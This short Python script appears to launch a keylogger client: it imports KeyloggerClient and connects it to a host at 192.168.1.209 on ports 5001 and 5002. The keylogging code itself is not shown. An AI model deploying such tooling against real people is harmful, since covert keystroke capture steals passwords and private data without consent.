from keylogger_client import KeyloggerClient


call = KeyloggerClient(5001, 5002, "192.168.1.209")
call.establishConnection()

